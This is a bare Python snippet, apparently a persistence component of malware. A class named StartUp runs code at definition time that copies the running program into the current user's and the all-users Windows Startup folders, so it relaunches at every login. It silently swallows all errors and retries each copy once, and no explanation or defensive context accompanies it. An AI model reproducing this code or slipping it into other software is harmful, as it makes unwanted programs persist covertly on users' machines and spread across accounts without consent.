class StartUp():
        import shutil
        import os
        from sys import argv

        roaming = os.getenv("appdata")

        startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        common_startup_loc = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"

        try:
            shutil.copy(argv[0], startup_loc)
        except Exception:
            try:
                shutil.copy(argv[0], startup_loc)
            except Exception:
                pass
            
        try:
            shutil.copy(argv[0], common_startup_loc)
        except Exception:
            try:
                shutil.copy(argv[0], common_startup_loc)
            except Exception:
                pass
